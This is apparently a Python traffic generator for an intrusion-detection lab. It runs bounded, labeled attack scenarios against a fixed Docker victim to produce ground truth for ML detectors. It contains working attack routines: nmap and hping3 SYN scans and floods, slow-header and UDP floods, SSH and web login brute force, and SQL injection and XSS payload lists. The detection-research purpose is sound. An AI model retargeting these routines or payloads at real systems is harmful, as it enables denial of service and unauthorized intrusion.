"""Run labeled, bounded traffic scenarios against the fixed Docker lab victim.

The campaign manifests provide ground truth. A traffic label does not mean the
ML/DL pipeline detected it; evaluate model verdicts after each isolated run.
"""

from __future__ import annotations

import argparse
from concurrent.futures import ThreadPoolExecutor
import hashlib
import logging
import random
import socket
import subprocess
import time
from urllib.parse import urlencode

import requests

from campaign_runtime import (
    BudgetExceeded,
    Campaign,
    VICTIM_HTTP,
    VICTIM_IP,
    VICTIM_UDP_PORT,
    load_profiles,
    new_campaign_id,
)


INVALID_PASSWORDS = [
    "123456", "password", "admin123", "welcome", "qwerty",
    "letmein", "monkey", "dragon", "master", "not-the-password",
]
SQLI_PROBES = [
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT 1, 'lab', 'user' --",
    "1' ORDER BY 1--+",
    "' OR 1=1 LIMIT 1; --",
]
XSS_PROBES = [
    "<script>alert('lab')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('lab')>",
]


def http_action(
    campaign: Campaign,
    method: str,
    path: str,
    action: str,
    *,
    params: dict | None = None,
    data: dict | bytes | None = None,
    headers: dict | None = None,
    expected_status: tuple[int, ...] = (200,),
    session: requests.Session | None = None,
) -> requests.Response | None:
    if not path.startswith("/") or path.startswith("//"):
        raise ValueError("HTTP path must stay on the fixed lab victim")
    query = urlencode(params or {})
    body = urlencode(data) if isinstance(data, dict) else data or b""
    body_size = len(body) if isinstance(body, bytes) else len(body.encode("utf-8"))
    estimated_bytes = (
        160 + len(path) + len(query) + body_size
        + sum(len(str(key)) + len(str(value)) for key, value in (headers or {}).items())
    )
    campaign.reserve(estimated_outbound_bytes=estimated_bytes)
    started = time.time()
    try:
        sender = session or requests
        response = sender.request(
            method,
            VICTIM_HTTP + path,
            params=params,
            data=data,
            headers=headers,
            timeout=max(0.2, min(2.0, campaign.remaining_seconds())),
        )
        accepted = response.status_code in expected_status
        campaign.record(
            action,
            started,
            success=accepted,
            response_bytes=len(response.content),
            detail=f"HTTP {response.status_code}",
        )
        return response if accepted else None
    except requests.RequestException as exc:
        campaign.record(action, started, success=False, detail=type(exc).__name__)
        return None


def scan(campaign: Campaign, _: random.Random) -> None:
    ports = campaign.profile.parameters["ports"]
    campaign.reserve(actions=len(ports), estimated_outbound_bytes=0)
    started = time.time()
    command = [
        "nmap", "-sS", "-Pn", "-T3", "--max-retries", "0",
        "-p", ",".join(map(str, ports)), VICTIM_IP,
    ]
    try:
        result = subprocess.run(
            command, capture_output=True, text=True,
            timeout=max(1.0, campaign.remaining_seconds()), check=False,
        )
        campaign.record(
            "tcp_port_sweep", started,
            success=result.returncode == 0,
            actions_completed=len(ports),
            detail=f"nmap exit {result.returncode}; {len(ports)} target ports",
        )
        print(result.stdout[:500], flush=True)
    except (OSError, subprocess.TimeoutExpired) as exc:
        campaign.record("tcp_port_sweep", started, success=False, detail=type(exc).__name__)


def botnet(campaign: Campaign, rng: random.Random) -> None:
    config = campaign.profile.parameters
    for index in range(config["count"]):
        if campaign.remaining_seconds() <= 0:
            break
        headers = {
            "User-Agent": "Mirai/Lab-Client-1.0",
            "X-Bot-ID": f"LAB-{rng.randint(1000, 9999)}",
        }
        http_action(
            campaign, "GET", "/lab/c2", "c2_checkin",
            params={"size": config["response_bytes"], "delay_ms": config["delay_ms"]},
            headers=headers,
        )
        if index + 1 < config["count"]:
            campaign.pause(config["interval_seconds"])


def ssh_bruteforce(campaign: Campaign, rng: random.Random) -> None:
    import paramiko

    # OpenSSH may close a connection after its lab rate limit is reached.
    # The manifest records that failure without Paramiko's worker traceback.
    logging.getLogger("paramiko").setLevel(logging.CRITICAL)

    config = campaign.profile.parameters
    guesses = rng.sample(INVALID_PASSWORDS, config["count"])
    for index, password in enumerate(guesses):
        if campaign.remaining_seconds() <= 0:
            break
        campaign.reserve(estimated_outbound_bytes=256)
        started = time.time()
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                VICTIM_IP, port=22, username="admin", password=password,
                look_for_keys=False, allow_agent=False,
                timeout=max(0.2, min(2.0, campaign.remaining_seconds())),
                auth_timeout=4.0, banner_timeout=4.0,
            )
            campaign.record("ssh_auth_failure", started, success=False,
                            detail="unexpected authentication success")
        except paramiko.AuthenticationException:
            # A rejected credential is the intended, observable lab action.
            campaign.record("ssh_auth_failure", started, success=True,
                            detail="authentication rejected")
        except (OSError, paramiko.SSHException) as exc:
            campaign.record("ssh_auth_failure", started, success=False,
                            detail=type(exc).__name__)
        finally:
            client.close()
        if index + 1 < config["count"]:
            campaign.pause(config["interval_seconds"])


def web_login(campaign: Campaign, rng: random.Random) -> None:
    config = campaign.profile.parameters
    guesses = rng.sample(INVALID_PASSWORDS, config["count"])
    for index, password in enumerate(guesses):
        if campaign.remaining_seconds() <= 0:
            break
        http_action(
            campaign, "POST", "/login", "http_login_failure",
            data={"username": "admin", "password": password},
            expected_status=(401,),
        )
        if index + 1 < config["count"]:
            campaign.pause(config["interval_seconds"])


def web_probes(campaign: Campaign, probes: list[str], kind: str) -> None:
    config = campaign.profile.parameters
    for index, payload in enumerate(probes[:config["count"]]):
        if campaign.remaining_seconds() <= 0:
            break
        http_action(campaign, "GET", "/search", kind, params={"q": payload})
        if index + 1 < config["count"]:
            campaign.pause(config["interval_seconds"])


def web_sqli(campaign: Campaign, _: random.Random) -> None:
    web_probes(campaign, SQLI_PROBES, "lab_sqli_probe")


def web_xss(campaign: Campaign, _: random.Random) -> None:
    web_probes(campaign, XSS_PROBES, "lab_xss_probe")


def http_load(campaign: Campaign, _: random.Random) -> None:
    config = campaign.profile.parameters

    def one_request(_: int) -> None:
        try:
            http_action(
                campaign, "GET", "/lab/load", "http_load",
                params={"size": config["response_bytes"], "delay_ms": config["delay_ms"]},
            )
        except BudgetExceeded:
            pass

    with ThreadPoolExecutor(max_workers=config["concurrency"]) as pool:
        list(pool.map(one_request, range(config["count"])))


def dos_slow(campaign: Campaign, _: random.Random) -> None:
    config = campaign.profile.parameters
    interval = config["fragment_interval_seconds"]
    duration = config["duration_seconds"]
    estimated = 120 + int(duration / interval + 1) * 18

    def one_connection(_: int) -> None:
        try:
            campaign.reserve(estimated_outbound_bytes=estimated)
        except BudgetExceeded:
            return
        started = time.time()
        fragments = 0
        try:
            with socket.create_connection((VICTIM_IP, 80), timeout=2.0) as connection:
                connection.settimeout(2.0)
                connection.sendall(
                    b"GET /lab/load HTTP/1.1\r\nHost: 192.168.100.10\r\n"
                )
                end = min(time.monotonic() + duration, campaign.deadline)
                while time.monotonic() < end:
                    connection.sendall(b"X-Lab-Pad: x\r\n")
                    fragments += 1
                    campaign.pause(interval)
            campaign.record("slow_http_headers", started, success=fragments > 0,
                            detail=f"{fragments} header fragments")
        except OSError as exc:
            campaign.record("slow_http_headers", started, success=False,
                            detail=type(exc).__name__)

    with ThreadPoolExecutor(max_workers=config["connections"]) as pool:
        list(pool.map(one_connection, range(config["connections"])))


def dos_syn(campaign: Campaign, _: random.Random) -> None:
    config = campaign.profile.parameters
    count = config["count"]
    campaign.reserve(actions=count, estimated_outbound_bytes=count * 40)
    started = time.time()
    command = [
        "hping3", "-S", "-p", "80", "-i",
        f"u{config['interval_microseconds']}", "--count", str(count), VICTIM_IP,
    ]
    try:
        result = subprocess.run(
            command, capture_output=True, text=True,
            timeout=max(1.0, campaign.remaining_seconds()), check=False,
        )
        campaign.record("tcp_syn_burst", started, success=result.returncode == 0,
                        actions_completed=count,
                        detail=f"hping3 exit {result.returncode}; requested {count}")
    except (OSError, subprocess.TimeoutExpired) as exc:
        campaign.record("tcp_syn_burst", started, success=False,
                        detail=type(exc).__name__)


def ddos_udp(campaign: Campaign, rng: random.Random) -> None:
    config = campaign.profile.parameters
    payload = rng.randbytes(config["payload_bytes"])
    interval = config["interval_ms"] / 1000.0
    for flow_index in range(config["flows"]):
        if campaign.remaining_seconds() <= 0:
            break
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
            for packet_index in range(config["packets_per_flow"]):
                try:
                    campaign.reserve(estimated_outbound_bytes=len(payload))
                except BudgetExceeded:
                    return
                started = time.time()
                try:
                    udp.sendto(payload, (VICTIM_IP, VICTIM_UDP_PORT))
                    campaign.record("udp_lab_datagram", started, success=True,
                                    detail=f"flow {flow_index + 1}")
                except OSError as exc:
                    campaign.record("udp_lab_datagram", started, success=False,
                                    detail=type(exc).__name__)
                if packet_index + 1 < config["packets_per_flow"]:
                    campaign.pause(interval)
        if flow_index + 1 < config["flows"]:
            campaign.pause(0.02)


def infiltration(campaign: Campaign, _: random.Random) -> None:
    canary_size = campaign.profile.parameters["canary_bytes"]
    with requests.Session() as session:
        http_action(
            campaign, "POST", "/lab/auth", "lab_auth_rejected",
            data={"username": "lab", "password": "wrong-lab-password"},
            expected_status=(401,), session=session,
        )
        accepted = http_action(
            campaign, "POST", "/lab/auth", "lab_auth_accepted",
            data={"username": "lab", "password": "lab-only-password"}, session=session,
        )
        if accepted is None:
            raise RuntimeError("lab authentication failed")
        token = accepted.json()["token"]
        headers = {"Authorization": f"Bearer {token}"}
        canary = http_action(
            campaign, "GET", "/lab/canary", "lab_canary_read",
            params={"size": canary_size}, headers=headers, session=session,
        )
        if canary is None or len(canary.content) != canary_size:
            raise RuntimeError("lab canary read failed or returned the wrong size")
        collected = http_action(
            campaign, "POST", "/lab/collect", "lab_canary_transfer",
            data=canary.content, headers=headers, session=session,
        )
        digest = hashlib.sha256(canary.content).hexdigest()
        if collected is None or collected.json().get("sha256") != digest:
            raise RuntimeError("lab canary collection did not verify")


HANDLERS = {
    "scan": scan,
    "botnet": botnet,
    "ssh_bruteforce": ssh_bruteforce,
    "web_login": web_login,
    "web_sqli": web_sqli,
    "web_xss": web_xss,
    "dos_http": http_load,
    "dos_slow": dos_slow,
    "dos_syn": dos_syn,
    "ddos_http_loic": http_load,
    "ddos_http_hoic": http_load,
    "ddos_udp": ddos_udp,
    "infiltration": infiltration,
}
ALIASES = {"dos": ["dos_http"], "bruteforce": ["ssh_bruteforce"],
           "web": ["web_sqli", "web_xss", "web_login"]}
ALL_LOCAL_MODES = [
    "scan", "botnet", "ssh_bruteforce", "dos_http", "infiltration",
    "web_sqli", "web_xss", "web_login",
]


def run_once(mode: str, profiles: dict, campaign_id: str, seed: int,
             worker_id: str) -> bool:
    campaign = Campaign(profiles[mode], campaign_id, seed, worker_id)
    print(f"[{campaign_id}] {mode}: {campaign.profile.class_label} "
          f"({campaign.profile.scenario_label}) from {campaign.source_ip}", flush=True)
    fatal_error = None
    try:
        HANDLERS[mode](campaign, random.Random(seed))
    except Exception as exc:
        fatal_error = f"{type(exc).__name__}: {exc}"
    path = campaign.write_manifest(fatal_error=fatal_error)
    if fatal_error:
        print(f"[{campaign_id}] ERROR: {fatal_error}", flush=True)
    print(f"[{campaign_id}] {campaign.actions_succeeded}/{campaign.actions_attempted} "
          f"actions succeeded; manifest: {path}", flush=True)
    return fatal_error is None and campaign.actions_succeeded > 0 and not campaign.errors


def main() -> int:
    profiles = load_profiles()
    if set(profiles) != set(HANDLERS):
        raise RuntimeError("profile and campaign handler modes differ")
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--attack", default="continuous",
        choices=sorted([*profiles, *ALIASES, "all", "continuous"]),
    )
    parser.add_argument("--campaign-id", default=None)
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--worker-id", default=socket.gethostname())
    parser.add_argument("--start-at-epoch", type=float, default=0.0)
    parser.add_argument("--max-campaigns", type=int, default=20)
    parser.add_argument("--max-runtime-seconds", type=int, default=300)
    args = parser.parse_args()
    if not 1 <= args.max_campaigns <= 20 or not 1 <= args.max_runtime_seconds <= 600:
        parser.error("continuous limits must be 1..20 campaigns and 1..600 seconds")
    if args.start_at_epoch:
        wait = args.start_at_epoch - time.time()
        if wait < -30 or wait > 60:
            parser.error("start epoch must be within -30..60 seconds of now")
        if wait > 0:
            time.sleep(wait)
    base_id = args.campaign_id or new_campaign_id()
    if args.attack == "continuous":
        randomizer = random.Random(args.seed)
        deadline = time.monotonic() + args.max_runtime_seconds
        for _ in range(args.max_campaigns):
            if time.monotonic() >= deadline:
                break
            mode = randomizer.choice(ALL_LOCAL_MODES)
            run_once(mode, profiles, new_campaign_id(), randomizer.randrange(2**31),
                     args.worker_id)
            time.sleep(min(randomizer.uniform(3, 8), max(0, deadline - time.monotonic())))
        return 0
    if args.attack == "all":
        modes = ALL_LOCAL_MODES
    else:
        modes = ALIASES.get(args.attack, [args.attack])
    success = True
    for index, mode in enumerate(modes):
        suffix = f"-{index + 1}" if len(modes) > 1 else ""
        run_id = base_id[:64 - len(suffix)] + suffix
        success = run_once(mode, profiles, run_id, args.seed + index,
                           args.worker_id) and success
    return 0 if success else 1


if __name__ == "__main__":
    raise SystemExit(main())
